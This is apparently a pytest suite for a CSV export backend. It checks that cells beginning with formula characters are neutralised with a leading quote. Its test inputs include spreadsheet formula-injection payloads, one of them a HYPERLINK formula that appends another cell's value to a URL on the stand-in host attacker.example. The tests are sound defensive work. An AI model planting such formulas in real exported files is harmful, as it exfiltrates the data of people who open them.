"""CSV formula/DDE injection sanitization tests.

Covers `_sanitize_csv_value()` per risky leading character plus the
`generate_file()` write path (filtering order, raw-text verification).
"""

from __future__ import annotations

import csv
import io

import pytest

from lexigram.admin.services.export.adapters.csv import (
    CsvExportBackend,
    _RISKY_LEADING_CHARS,
    _sanitize_csv_value,
)
from lexigram.admin.services.export.scheduler import ExportFormat, ExportJob


class _StubStorage:
    """Captures upload payloads."""

    def __init__(self) -> None:
        self.uploaded: bytes | None = None

    async def upload(
        self, file_path: str, content: bytes, content_type: str
    ) -> None:
        self.uploaded = content


@pytest.mark.parametrize(
    "raw",
    ["=HYPERLINK(\"http://attacker.example\")", "+1+1", "-SUM(A1:A9)", "@cmd",
     "\t=1", "\r=1"],
)
def test_risky_leading_chars_are_prefixed(raw: str) -> None:
    """Every risky leading character gets a leading single quote."""
    assert raw[0] in _RISKY_LEADING_CHARS
    assert _sanitize_csv_value(raw) == f"'{raw}"


@pytest.mark.parametrize(
    "value",
    ["Admin", "123", " spaced", ""],
)
def test_non_risky_strings_pass_through(value: str) -> None:
    """Strings not starting with a risky character are unchanged."""
    assert _sanitize_csv_value(value) is value


@pytest.mark.parametrize("value", [1, True, False, None])
def test_non_strings_pass_through(value: object) -> None:
    """Non-string values pass through unchanged and same type."""
    assert _sanitize_csv_value(value) is value


def test_prefix_is_lossless() -> None:
    """A single quote itself is not double-prefixed."""
    assert _sanitize_csv_value("'=already-safe") == "'=already-safe"


@pytest.mark.asyncio
async def test_generate_file_sanitizes_payload_text() -> None:
    """Written CSV cell carries the raw '= prefix, numeric cell untouched."""
    backend = CsvExportBackend()
    job = ExportJob(
        job_id="job-1",
        resource_name="users",
        format=ExportFormat.CSV,
    )
    data = [
        {
            "name": '=HYPERLINK("http://attacker.example/c?x="&A2,"Open")',
            "count": 3,
        }
    ]
    storage = _StubStorage()

    await backend.generate_file(job, data, storage, "/tmp/export")

    assert storage.uploaded is not None
    content = storage.uploaded.decode("utf-8")
    rows = list(csv.reader(io.StringIO(content)))
    assert len(rows) == 2  # header + data row
    assert rows[0] == ["name", "count"]
    assert rows[1][0].startswith("'=HYPERLINK")
    assert rows[1][1] == "3"


@pytest.mark.asyncio
async def test_generate_file_sanitizes_after_column_filtering() -> None:
    """Column filtering happens first, sanitization second."""
    backend = CsvExportBackend()
    job = ExportJob(
        job_id="job-2",
        resource_name="users",
        format=ExportFormat.CSV,
        columns=["name"],
    )
    data = [{"name": "=1+1", "count": 3}]
    storage = _StubStorage()

    await backend.generate_file(job, data, storage, "/tmp/export")

    assert storage.uploaded is not None
    content = storage.uploaded.decode("utf-8")
    rows = list(csv.reader(io.StringIO(content)))
    assert rows[0] == ["name"]
    assert rows[1] == ["'=1+1"]
